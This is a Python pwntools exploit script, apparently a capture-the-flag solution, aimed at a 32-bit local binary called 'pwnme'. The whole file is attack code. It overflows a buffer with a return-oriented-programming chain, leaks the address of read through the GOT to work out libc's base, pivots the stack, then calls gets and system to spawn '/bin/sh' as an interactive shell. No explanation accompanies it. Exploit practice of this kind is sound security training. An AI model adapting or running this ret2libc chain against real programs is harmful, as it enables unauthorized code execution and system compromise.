from pwn import *

lib = ELF('/lib32/libc.so.6')
elf = ELF('pwnme')

write = elf.symbols['write']
read = elf.symbols['read']
read_off = lib.symbols['read']
read_got_plt = elf.got['read']
system_off = lib.symbols['system']
gets_off = lib.symbols['gets']

add_esp_8_pop_ebp_ret = 0x0804830e
pop_ebp_ret = 0x0804853f
#lib_start_main_got = 0x0804A034
leave_ret = 0x080483e8

buf1 = 0x0804b000 - 200
buf2 = 0x0804b000 - 300
buf = 0x0804b000 - 50

c = process('pwnme')

rop = [
	write,
	add_esp_8_pop_ebp_ret,
	0x1,
	read_got_plt,
	0x4,
	read,
	add_esp_8_pop_ebp_ret,
	0x0,
	buf2,
	0x60,
	pop_ebp_ret,
	buf2-4,
	leave_ret
]

print c.recvuntil(':')
c.recvline()
c.sendline('a'*20 + flat(rop))

libc_base = u32(c.recv()[:4]) - read_off
print 'libc_base: ' + hex(libc_base)
gets = libc_base + gets_off
system = libc_base + system_off

rop2 = [
	gets,
	system,
	buf,
	buf
]

c.send(''.join(map(p32,rop2)) + '\n')
c.sendline('/bin/sh\x00')
c.interactive()

